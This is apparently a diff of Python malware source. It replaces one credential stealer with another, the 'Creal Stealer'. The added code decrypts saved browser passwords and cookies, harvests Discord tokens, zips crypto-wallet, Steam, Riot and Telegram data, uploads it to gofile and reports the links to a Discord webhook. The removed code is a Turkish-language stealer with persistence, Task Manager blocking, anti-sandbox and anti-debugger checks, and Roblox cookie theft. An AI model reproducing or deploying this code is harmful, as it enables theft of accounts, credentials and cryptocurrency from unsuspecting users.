+                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                    }
+                }
+            ],
+            "username": "Creal",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+            "attachments": []
+            }
+        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
+        return
 
-    def main(self):
-        try:
-            self.startup_persistence()
-           
-            if not Checks.is_windows():
-                print('Windows işletim sistemi değil')
-                return
-            if not Checks.is_connected():
-                print('İnternet yok')
-                return
-            
-            if Checks.is_admin():
-                self.block_task_manager()
-                self.task_manager_blocked = True
-
-            zip_file_path = os.path.join(Paths().temp, self.zip_name)
-            zip_file = zipfile.ZipFile(zip_file_path, "w", zipfile.ZIP_DEFLATED)
-            
-            sucess = self.start_stealer(zip_file)
-
-            zip_file.close()
-
-            if sucess:
-                print("Herşey başarılı.")
-                gofile_url = self.upload_gofile(zip_file_path)
-                if gofile_url:
-                    self.send_webhook(gofile_url=gofile_url, file_path=None)
-                else:
-                    self.send_webhook(gofile_url=None, file_path=zip_file_path)
-
-                self.delete_file(zip_file_path)
-            else:
-                print("Vaporlock Başarasız.")
-            
-            if self.task_manager_blocked:
-                self.unblock_task_manager()
-                self.task_manager_blocked = False
-        except Exception:
-            pass
+    if name == "kiwi":
+        data = {
+            "content": f"{globalInfo()}",
+            "embeds": [
+                {
+                "color": 2895667,
+                "fields": [
+                    {
+                    "name": "Interesting files found on user PC:",
+                    "value": link
+                    }
+                ],
+                "author": {
+                    "name": "Creal | File Stealer"
+                },
+                "footer": {
+                    "text": "Creal Stealer",
+                    "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                }
+                }
+            ],
+            "username": "Creal Stealer",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+            "attachments": []
+            }
+        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
+        return
 
 
-class AntiSandbox:
-    DLL_INDICATORS = [
-        "SbieDll.dll", "VBoxHook.dll", "VBoxSF.dll", "VBoxDisp.dll",
-        "vmcheck.dll", "wpespy.dll", "snxhk.dll", "dbghelp.dll", "dbgcore.dll"
+
+
+# def upload(name, tk=''):
+#     headers = {
+#         "Content-Type": "application/json",
+#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+#     }
+
+#     # r = requests.post(hook, files=files)
+#     LoadRequests("POST", hook, files=files)
+    _
+
+
+
+
+def wr1tef0rf1l3(data, name):
+    path = os.getenv("TEMP") + f"\cr{name}.txt"
+    with open(path, mode='w', encoding='utf-8') as f:
+        f.write(f"<--Creal STEALER BEST -->\n\n")
+        for line in data:
+            if line[0] != '':
+                f.write(f"{line}\n")
+
+T0k3ns = ''
+def getT0k3n(path, arg):
+    if not os.path.exists(path): return
+
+    path += arg
+    for file in os.listdir(path):
+        if file.endswith(".log") or file.endswith(".ldb")   :
+            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
+                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
+                    for t0k3n in re.findall(regex, line):
+                        global T0k3ns
+                        if ch1ckT4k1n(t0k3n):
+                            if not t0k3n in T0k3ns:
+                                # print(token)
+                                T0k3ns += t0k3n
+                                upl05dT4k31(t0k3n, path)
+
+P4ssw = []
+def getP4ssw(path, arg):
+    global P4ssw, P4sswCount
+    if not os.path.exists(path): return
+
+    pathC = path + arg + "/Login Data"
+    if os.stat(pathC).st_size == 0: return
+
+    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+
+    shutil.copy2(pathC, tempfold)
+    conn = sql_connect(tempfold)
+    cursor = conn.cursor()
+    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
+    data = cursor.fetchall()
+    cursor.close()
+    conn.close()
+    os.remove(tempfold)
+
+    pathKey = path + "/Local State"
+    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+    master_key = CryptUnprotectData(master_key[5:])
+
+    for row in data: 
+        if row[0] != '':
+            for wa in keyword:
+                old = wa
+                if "https" in wa:
+                    tmp = wa
+                    wa = tmp.split('[')[1].split(']')[0]
+                if wa in row[0]:
+                    if not old in paswWords: paswWords.append(old)
+            P4ssw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3kryptV4lU3(row[2], master_key)}")
+            P4sswCount += 1
+    wr1tef0rf1l3(P4ssw, 'passw')
+
+C00k13 = []    
+def getC00k13(path, arg):
+    global C00k13, CookiCount
+    if not os.path.exists(path): return
+    
+    pathC = path + arg + "/Cookies"
+    if os.stat(pathC).st_size == 0: return
+    
+    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    
+    shutil.copy2(pathC, tempfold)
+    conn = sql_connect(tempfold)
+    cursor = conn.cursor()
+    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+    data = cursor.fetchall()
+    cursor.close()
+    conn.close()
+    os.remove(tempfold)
+
+    pathKey = path + "/Local State"
+    
+    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+    master_key = CryptUnprotectData(master_key[5:])
+
+    for row in data: 
+        if row[0] != '':
+            for wa in keyword:
+                old = wa
+                if "https" in wa:
+                    tmp = wa
+                    wa = tmp.split('[')[1].split(']')[0]
+                if wa in row[0]:
+                    if not old in cookiWords: cookiWords.append(old)
+            C00k13.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3kryptV4lU3(row[2], master_key)}")
+            CookiCount += 1
+    wr1tef0rf1l3(C00k13, 'cook')
+
+def G3tD1sc0rd(path, arg):
+    if not os.path.exists(f"{path}/Local State"): return
+
+    pathC = path + arg
+
+    pathKey = path + "/Local State"
+    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+    master_key = CryptUnprotectData(master_key[5:])
+    # print(path, master_key)
+    
+    for file in os.listdir(pathC):
+        # print(path, file)
+        if file.endswith(".log") or file.endswith(".ldb")   :
+            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
+                for t0k3n in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                    global T0k3ns
+                    t0k3nDecoded = D3kryptV4lU3(b64decode(t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)
+                    if ch1ckT4k1n(t0k3nDecoded):
+                        if not t0k3nDecoded in T0k3ns:
+                            # print(token)
+                            T0k3ns += t0k3nDecoded
+                            # writeforfile(Tokens, 'tokens')
+                            upl05dT4k31(t0k3nDecoded, path)
+
+def GatherZips(paths1, paths2, paths3):
+    thttht = []
+    for patt in paths1:
+        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]])
+        a.start()
+        thttht.append(a)
+
+    for patt in paths2:
+        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]])
+        a.start()
+        thttht.append(a)
+    
+    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
+    a.start()
+    thttht.append(a)
+
+    for thread in thttht: 
+        thread.join()
+    global WalletsZip, GamingZip, OtherZip
+        # print(WalletsZip, GamingZip, OtherZip)
+
+    wal, ga, ot = "",'',''
+    if not len(WalletsZip) == 0:
+        wal = ":coin:  •  Wallets\n"
+        for i in WalletsZip:
+            wal += f"└─ [{i[0]}]({i[1]})\n"
+    if not len(WalletsZip) == 0:
+        ga = ":video_game:  •  Gaming:\n"
+        for i in GamingZip:
+            ga += f"└─ [{i[0]}]({i[1]})\n"
+    if not len(OtherZip) == 0:
+        ot = ":tickets:  •  Apps\n"
+        for i in OtherZip:
+            ot += f"└─ [{i[0]}]({i[1]})\n"          
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
+    
+    data = {
+        "content": globalInfo(),
+        "embeds": [
+            {
+            "title": "Creal Zips",
+            "description": f"{wal}\n{ga}\n{ot}",
+            "color": 2895667,
+            "footer": {
+                "text": "Creal Stealer",
+                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+            }
+            }
+        ],
+        "username": "Creal Stealer",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+        "attachments": []
+    }
+    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
+
+
+def ZipTelegram(path, arg, procc):
+    global OtherZip
+    pathC = path
+    name = arg
+    if not os.path.exists(pathC): return
+    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+
+    zf = ZipFile(f"{pathC}/{name}.zip", "w")
+    for file in os.listdir(pathC):
+        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
+            zf.write(pathC + "/" + file)
+    zf.close()
+
+    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
+    #lnik = "https://google.com"
+    os.remove(f"{pathC}/{name}.zip")
+    OtherZip.append([arg, lnik])
+
+def Z1pTh1ngs(path, arg, procc):
+    pathC = path
+    name = arg
+    global WalletsZip, GamingZip, OtherZip
+    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
+    # os.system(f"taskkill /im {procc} /t /f")
+
+    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
+        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
+        name = f"Metamask_{browser}"
+        pathC = path + arg
+    
+    if not os.path.exists(pathC): return
+    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+
+    if "Wallet" in arg or "NationsGlory" in arg:
+        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
+        name = f"{browser}"
+
+    elif "Steam" in arg:
+        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
+        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
+        data = f.readlines()
+        # print(data)
+        found = False
+        for l in data:
+            if 'RememberPassword"\t\t"1"' in l:
+                found = True
+        if found == False: return
+        name = arg
+
+
+    zf = ZipFile(f"{pathC}/{name}.zip", "w")
+    for file in os.listdir(pathC):
+        if not ".zip" in file: zf.write(pathC + "/" + file)
+    zf.close()
+
+    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
+    #lnik = "https://google.com"
+    os.remove(f"{pathC}/{name}.zip")
+
+    if "Wallet" in arg or "eogaeaoehlef" in arg:
+        WalletsZip.append([name, lnik])
+    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
+        GamingZip.append([name, lnik])
+    else:
+        OtherZip.append([name, lnik])
+
+
+def GatherAll():
+    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
+    browserPaths = [
+        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
+        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
+        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
+        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
+        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
+        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
+        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
+        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
     ]
 
-    VM_MAC_PREFIXES = [
-        "00:05:69",  # VMware
-        "00:0C:29",
-        "00:1C:14",
-        "00:50:56",
-        "08:00:27",  # VirtualBox
+    discordPaths = [
+        [f"{roaming}/Discord", "/Local Storage/leveldb"],
+        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
+        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
+        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
     ]
 
-    @staticmethod
-    def detect_dlls() -> bool:
-        GetModuleHandle = ctypes.windll.kernel32.GetModuleHandleA
-        for dll in AntiSandbox.DLL_INDICATORS:
-            if GetModuleHandle(dll.encode()) != 0:
-                return True
-        return False
+    PathsToZip = [
+        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
+        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
+        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
+        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
+        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
+    ]
+    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
 
-    @staticmethod
-    def detect_mac() -> bool:
-        try:
-            output = subprocess.check_output("getmac", creationflags=0x08000000)
-            output = output.decode(errors="ignore")
+    for patt in browserPaths: 
+        a = threading.Thread(target=getT0k3n, args=[patt[0], patt[2]])
+        a.start()
+        Threadlist.append(a)
+    for patt in discordPaths: 
+        a = threading.Thread(target=G3tD1sc0rd, args=[patt[0], patt[1]])
+        a.start()
+        Threadlist.append(a)
 
-            macs = re.findall(r"([0-9A-F]{2}(?:-[0-9A-F]{2}){5})", output, re.I)
-            macs = [mac.replace("-", ":").lower() for mac in macs]
+    for patt in browserPaths: 
+        a = threading.Thread(target=getP4ssw, args=[patt[0], patt[3]])
+        a.start()
+        Threadlist.append(a)
 
-            for mac in macs:
-                if any(mac.startswith(prefix.lower()) for prefix in AntiSandbox.VM_MAC_PREFIXES):
-                    return True
-        except:
-            pass
-        return False
+    ThCokk = []
+    for patt in browserPaths: 
+        a = threading.Thread(target=getC00k13, args=[patt[0], patt[4]])
+        a.start()
+        ThCokk.append(a)
 
-    @staticmethod
-    def detect_hardware() -> bool:
-        try:
-            class MEMORYSTATUS(ctypes.Structure):
-                _fields_ = [
-                    ('dwLength', ctypes.c_ulong),
-                    ('dwMemoryLoad', ctypes.c_ulong),
-                    ('ullTotalPhys', ctypes.c_ulonglong),
-                    ('ullAvailPhys', ctypes.c_ulonglong),
-                    ('ullTotalPageFile', ctypes.c_ulonglong),
-                    ('ullAvailPageFile', ctypes.c_ulonglong),
-                    ('ullTotalVirtual', ctypes.c_ulonglong),
-                    ('ullAvailVirtual', ctypes.c_ulonglong),
-                    ('sullAvailExtendedVirtual', ctypes.c_ulonglong),
-                ]
-
-            mem = MEMORYSTATUS()
-            mem.dwLength = ctypes.sizeof(mem)
-            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
-
-            ram_gb = mem.ullTotalPhys / (1024**3)
-
-            cpu_count = os.cpu_count()
-
-            return ram_gb < 3 or cpu_count <= 2
-
-        except:
-            return False
-
-    @staticmethod
-    def detect_boot_time() -> bool:
-        try:
-            uptime = time.time() - psutil.boot_time()
-            return uptime < 60
-        except:
-            return False
-
-    @staticmethod
-    def detect_wine() -> bool:
-        return os.path.exists("C:\\windows\\system32\\wineboot.exe")
+    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()
 
 
-class Checks:
-    @staticmethod
-    def is_connected() -> bool:
-        try:
-            requests.get("https://www.google.com", timeout=5)
-            return True
-        except (requests.ConnectionError, requests.Timeout):
-            return False
+    for thread in ThCokk: thread.join()
+    DETECTED = TR6st(C00k13)
+    if DETECTED == True: return
+
+    for patt in browserPaths:
+         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]]).start()
     
-    @staticmethod
-    def is_windows() -> bool:
-        return platform.system().lower() == "windows"
+    for patt in PathsToZip:
+         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]]).start()
     
-    @staticmethod
-    def is_admin() -> bool:
-        try:
-            return ctypes.windll.shell32.IsUserAnAdmin()
-        except:
-            return False
+    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()
 
-    @staticmethod
-    def is_sandboxed() -> bool:
-        checks = [
-            AntiSandbox.detect_mac(),
-            AntiSandbox.detect_dlls(),
-            AntiSandbox.detect_wine(),
-            AntiSandbox.detect_hardware(),
-            AntiSandbox.detect_boot_time()
-        ]
-        return any(checks)
+    for thread in Threadlist: 
+        thread.join()
+    global upths
+    upths = []
 
-    @staticmethod
-    def is_debugged() -> bool:
-        blacklist_programs = ['cheatengine', 'cheat engine', 'x32dbg', 'x64dbg', 'ollydbg', 'windbg', 'ida', 'ida64', 'ghidra', 'radare2', 'radare', 'dbg', 'immunitydbg', 'dnspy', 'softice', 'edb', 'debugger', 'visual studio debugger', 'lldb', 'gdb', 'valgrind', 'hex-rays', 'disassembler', 'tracer', 'debugview', 'procdump', 'strace', 'ltrace', 'drmemory', 'decompiler', 'hopper', 'binary ninja', 'bochs', 'vdb', 'frida', 'api monitor', 'process hacker', 'sysinternals', 'procexp', 'process explorer', 'monitor tool', 'vmmap', 'xperf', 'perfview', 'py-spy', 'strace-log', "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray", "vmwareuser", "wireshark", "procmon"]
-        try:
-            for proc in psutil.process_iter(['name']):
-                try:
-                    name = proc.info['name'].lower()
-                    if any(x in name for x in blacklist_programs):
-                        return True
-                except (psutil.NoSuchProcess, psutil.AccessDenied):
-                    continue
-        except Exception:
-            pass
+    for file in ["crpassw.txt", "crcook.txt"]: 
+        # upload(os.getenv("TEMP") + "\\" + file)
+        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))
 
-        return False
+def uploadToAnonfiles(path):
+    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
+    except:return False
 
+# def uploadToAnonfiles(path):s
+#     try:
+#         files = { "file": (path, open(path, mode='rb')) }
+#         upload = requests.post("https://transfer.sh/", files=files)
+#         url = upload.text
+#         return url
+#     except:
+#         return False
 
-class StealerFunctions:
-    @staticmethod
-    def System_Infos(zip_file):
-        info = False
-        space = ' '
-
-        def info():
-            ip_info = ''
-            with suppress(Exception):
-                eva = requests.get("https://ipwhois.app/json/").json()
-                for i in eva:
-                    len_i = len(i)
-                    pad = 20-len_i
-                    ip_info += f"    - {i}{space*pad}: {eva[i]}\n"
-                return ip_info
-            return '''No IP infos.'''
-
-        try: 
-            IPinfos = info()
-
-            cpu_count = psutil.cpu_count(logical=True)
-            ram_total = round(psutil.virtual_memory().total / (1024**3), 2)
-            disk_usage = psutil.disk_usage('/').percent
-
-            net_info = ''
-            with suppress(Exception):
-                interfaces = psutil.net_if_addrs()
-                max_len = max(len(i) for i in interfaces)
-
-                for iface, addr_list in interfaces.items():
-                    for addr in addr_list:
-                        if addr.family == socket.AF_INET:
-                            pad = max_len - len(iface)
-                            net_info += f"    - {iface}{space * pad} : {addr.address}\n"
-
-            system_infos = f"""
-System infos:
-    - hostname      : {socket.gethostname()}
-    - username      : {getpass.getuser()}
-    - processor     : {platform.processor()}
-    - machine       : {platform.machine()}
-    - platform      : {platform.platform()}
-    - system        : {platform.system()}
-    - release       : {platform.release()}
-    - version       : {platform.version()}
-    - CPU cores     : {cpu_count}
-    - RAM total(GB) : {ram_total}
-    - Disk usage(%) : {disk_usage}
-    - local IP      : {socket.gethostbyname(socket.gethostname())}
-
-Network interfaces:
-{net_info}
-Public IP infos:
-{IPinfos}
-        """
-            info = True
-        except:
-            info = False
-            system_infos = "No infos."
-            
-        zip_file.writestr(f"sistem_bilgisi.txt", system_infos)
-        return info
-    
-    @staticmethod
-    def Roblox_Cookies(zip_file):
-        file_roblox_account = ""
-        number_roblox_account = 0
-        cookie_list = []
-
-        def GetCookie(cookies):
-            try:
-                for c in cookies:
-                    if c.name == '.ROBLOSECURITY':
-                        return c.value
-                return None
-            except:
-                return None
-
-        browsers = [
-            browser_cookie3.edge,
-            browser_cookie3.chrome,
-            browser_cookie3.opera,
-            browser_cookie3.firefox,
-            browser_cookie3.opera_gx,
-            browser_cookie3.brave
-        ]
-
-        for browser_func in browsers:
-            try:
-                cookies = browser_func(domain_name=".roblox.com")
-                cookie = GetCookie(cookies)
-                if cookie and cookie not in cookie_list:
-                    cookie_list.append(cookie)
-                    number_roblox_account += 1
-
-                    try:
-                        info = requests.get(
-                            "https://users.roblox.com/v1/users/authenticated",
-                            cookies={".ROBLOSECURITY": cookie},
-                            timeout=10
-                        )
-                        api = info.json() if info.status_code == 200 else {}
-                    except:
-                        api = {}
-
-                    user_id = api.get('id', "None")
-                    username = api.get('name', "None")
-                    display_name = api.get('displayName', "None")
-
-                    file_roblox_account += f"""Roblox Hesaplari n°{number_roblox_account}:
-- Navigator     : {browser_func.__name__}
-    - Id            : {user_id}
-    - Isim      : {username}
-    - Takma Ad   : {display_name}
-    - Kurabiye        : {cookie}
-                        """
-            except Exception:
-                continue
-
-        if not cookie_list:
-            file_roblox_account = "Roblox kurabiyesi bulunamadi."
-
-        zip_file.writestr(f"Roblox Hesaplari ({number_roblox_account}).txt", file_roblox_account)
-        return number_roblox_account
-        
-    @staticmethod
-    def Discord_Tokens(zip_file):
-        file_discord_account = ""
-        number_discord_account = 0
-
-        def ExtractToken():  
-            base_url = "https://discord.com/api/v9/users/@me"
-            regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
-            regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
-            tokens = []
-            uids = []
-            token_info = {}
-
-            
-            path_appdata_local = Paths().appdata_local
-            path_appdata_roaming = Paths().appdata_roaming
-
-            paths = [
-                ("Discord",                os.path.join(path_appdata_roaming, "discord", "Local Storage", "leveldb"),                                                  ""),
-                ("Discord Canary",         os.path.join(path_appdata_roaming, "discordcanary", "Local Storage", "leveldb"),                                            ""),
-                ("Lightcord",              os.path.join(path_appdata_roaming, "Lightcord", "Local Storage", "leveldb"),                                                ""),
-                ("Discord PTB",            os.path.join(path_appdata_roaming, "discordptb", "Local Storage", "leveldb"),                                               ""),
-                ("Opera",                  os.path.join(path_appdata_roaming, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),                           "opera.exe"),
-                ("Opera GX",               os.path.join(path_appdata_roaming, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),                        "opera.exe"),
-                ("Opera Neon",             os.path.join(path_appdata_roaming, "Opera Software", "Opera Neon", "Local Storage", "leveldb"),                             "opera.exe"),
-                ("Amigo",                  os.path.join(path_appdata_local,   "Amigo", "User Data", "Local Storage", "leveldb"),                                       "amigo.exe"),
-                ("Torch",                  os.path.join(path_appdata_local,   "Torch", "User Data", "Local Storage", "leveldb"),                                       "torch.exe"),
-                ("Kometa",                 os.path.join(path_appdata_local,   "Kometa", "User Data", "Local Storage", "leveldb"),                                      "kometa.exe"),
-                ("Orbitum",                os.path.join(path_appdata_local,   "Orbitum", "User Data", "Local Storage", "leveldb"),                                     "orbitum.exe"),
-                ("CentBrowser",            os.path.join(path_appdata_local,   "CentBrowser", "User Data", "Local Storage", "leveldb"),                                 "centbrowser.exe"),
-                ("7Star",                  os.path.join(path_appdata_local,   "7Star", "7Star", "User Data", "Local Storage", "leveldb"),                              "7star.exe"),
-                ("Sputnik",                os.path.join(path_appdata_local,   "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),                          "sputnik.exe"),
-                ("Vivaldi",                os.path.join(path_appdata_local,   "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),                          "vivaldi.exe"),
-                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),                 "chrome.exe"),
-                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),               "chrome.exe"),
-                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),               "chrome.exe"),
-                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb"),               "chrome.exe"),
-                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb"),               "chrome.exe"),
-                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb"),               "chrome.exe"),
-                ("Google Chrome SxS",      os.path.join(path_appdata_local,   "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
-                ("Google Chrome Beta",     os.path.join(path_appdata_local,   "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb"),            "chrome.exe"),
-                ("Google Chrome Dev",      os.path.join(path_appdata_local,   "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
-                ("Google Chrome Unstable", os.path.join(path_appdata_local,   "Google", "Chrome Unstable", "User Data", "Default", "Local Storage", "leveldb"),        "chrome.exe"),
-                ("Google Chrome Canary",   os.path.join(path_appdata_local,   "Google", "Chrome Canary", "User Data", "Default", "Local Storage", "leveldb"),          "chrome.exe"),
-                ("Epic Privacy Browser",   os.path.join(path_appdata_local,   "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),                        "epic.exe"),
-                ("Microsoft Edge",         os.path.join(path_appdata_local,   "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),                "msedge.exe"),
-                ("Uran",                   os.path.join(path_appdata_local,   "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),                "uran.exe"),
-                ("Yandex",                 os.path.join(path_appdata_local,   "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),          "yandex.exe"),
-                ("Yandex Canary",          os.path.join(path_appdata_local,   "Yandex", "YandexBrowserCanary", "User Data", "Default", "Local Storage", "leveldb"),    "yandex.exe"),
-                ("Yandex Developer",       os.path.join(path_appdata_local,   "Yandex", "YandexBrowserDeveloper", "User Data", "Default", "Local Storage", "leveldb"), "yandex.exe"),
-                ("Yandex Beta",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserBeta", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
-                ("Yandex Tech",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserTech", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
-                ("Yandex SxS",             os.path.join(path_appdata_local,   "Yandex", "YandexBrowserSxS", "User Data", "Default", "Local Storage", "leveldb"),       "yandex.exe"),
-                ("Brave",                  os.path.join(path_appdata_local,   "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),   "brave.exe"),
-                ("Iridium",                os.path.join(path_appdata_local,   "Iridium", "User Data", "Default", "Local Storage", "leveldb"),                          "iridium.exe"),
-            ]
-
-            try:
-                for name, path, proc_name in paths:
-                    for proc in psutil.process_iter(['pid', 'name']):
-                        try:
-                            if proc.name().lower() == proc_name.lower():
-                                proc.kill()
-                        except:
-                            pass
-            except:
-                pass
-
-            for name, path, proc_name in paths:
-                if not os.path.exists(path):
-
-                    continue
-                _d15c0rd = name.replace(" ", "").lower()
-                if "cord" in path:
-                    if not os.path.exists(os.path.join(path_appdata_roaming, _d15c0rd, 'Local State')):
-                        continue
-                    for file_name in os.listdir(path):
-                        if file_name[-3:] not in ["log", "ldb"]:
-                            continue
-                        total_path = os.path.join(path, file_name)
-                        if os.path.exists(total_path):
-                            with open(total_path, errors='ignore') as file:
-                                for line in file:
-                                    for y in re.findall(regexp_enc, line.strip()):
-                                        token = DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), GetMasterKey(os.path.join(path_appdata_roaming, _d15c0rd, 'Local State')))
-                                        if ValidateToken(token, base_url):
-                                            uid = requests.get(base_url, headers={'Authorization': token}).json()['id']
-                                            if uid not in uids:
-                                                tokens.append(token)
-                                                uids.append(uid)
-                                                token_info[token] = (name, total_path)
-                else:
-                    for file_name in os.listdir(path):
-                        if file_name[-3:] not in ["log", "ldb"]:
-                            continue
-                        total_path = os.path.join(path, file_name)
